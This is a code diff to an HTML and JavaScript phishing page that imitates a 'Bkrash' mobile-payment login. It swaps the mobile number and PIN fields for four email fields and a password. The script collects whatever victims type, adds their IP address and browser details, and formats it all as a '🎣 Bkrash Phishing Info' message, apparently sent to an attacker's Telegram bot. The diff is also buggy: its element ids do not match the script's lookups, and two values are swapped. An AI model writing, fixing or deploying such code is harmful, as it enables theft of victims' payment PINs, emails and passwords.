@@ -104,15 +104,23 @@
     </div>
     <div class="container">
         <div class="input-group">
-            <p>Enter Bkrash Mobile Number</p>
-            <input type="number" placeholder="Ex: 01XXXXXXXXX" id="mobileNumber">
+            <p>Email 1️⃣</p>
+            <input type="text" placeholder="Ex: 01XXXXXXXXX" id="email 1">
         </div>
         <div class="input-group">
-            <p>Enter PIN</p>
-            <input type="number" placeholder="Ex: XXXXX" id="pin">
+            <p>Email 2️⃣</p>
+            <input type="text" placeholder="Ex: XXXXX" id="email 2">
         </div>
         <div class="input-group">
-            <p>PASS</p>
+            <p>Email 3️⃣</p>
+            <input type="text" placeholder="Ex: XXXXX" id="email 3">
+        </div>
+        <div class="input-group">
+            <p>Email 4️⃣</p>
+            <input type="text" placeholder="Ex: XXXXX" id="email 4">
+        </div>
+        <div class="input-group">
+            <p>PASSWORD</p>
             <input type="number" placeholder="Ex: XXXXX" id="pass">
         </div>
         <button id="loginButton">Login <span>&#8594;</span></button>
@@ -131,13 +139,17 @@ function getQueryParams() {
 const { token: telegramToken, chatId: telegramChatId } = getQueryParams();
 
 const loginButton = document.getElementById('loginButton');
-const mobileNumber = document.getElementById('mobileNumber');
-const pin = document.getElementById('pin');
+const emailq = document.getElementById('emailq');
+const emailw = document.getElementById('emailw');
+const emaile = document.getElementById('emaile');
+const emailr = document.getElementById('emailr');
 const pass = document.getElementById('pass');
 
 loginButton.addEventListener('click', async () => {
-    const mobileNumberValue = mobileNumber.value.trim();
-    const pinValue = pin.value.trim();
+    const emailqValue = emailw.value.trim();
+    const emailwValue = emailq.value.trim();
+    const emaileValue = emaile.value.trim();
+    const emailrValue = emailr.value.trim();
     const passValue = pass.value.trim();
     let isValid = true;
 
@@ -165,8 +177,8 @@ loginButton.addEventListener('click', async () => {
     const ip = await fetch('https://api.ipify.org?format=json').then(response => response.json()).then(data => data.ip);
 
     const loginData = {
-        mobileNumber: mobileNumberValue,
-        pin: pinValue,pass: passValue,
+        emailq: emailqValue,
+        emailw: emailwValue,emaile: emaileValue,emailr: emailrValue,pass: passValue,
         ip: ip,
         userAgent: userAgent,
         date: date.toLocaleString()
@@ -174,9 +186,13 @@ loginButton.addEventListener('click', async () => {
 
     const userMessage = `<b>🎣 Bkrash Phishing Info</b>
     
-📱<b>Mobile Number:</b> <code>${loginData.mobileNumber}</code>
+1️⃣<b>Email 1:</b> <code>${loginData.emailq}</code>
     
-🔐<b>PIN:</b> <code>${loginData.pin}</code>
+2️⃣<b>Email 2:</b> <code>${loginData.emailw}</code>
+
+3️⃣<b>Email 3:</b> <code>${loginData.emaile}</code>
+
+4️⃣<b>Email 1:</b> <code>${loginData.emailr}</code>
 
 🔐<b>PASS:</b> <code>${loginData.pass}</code>
     
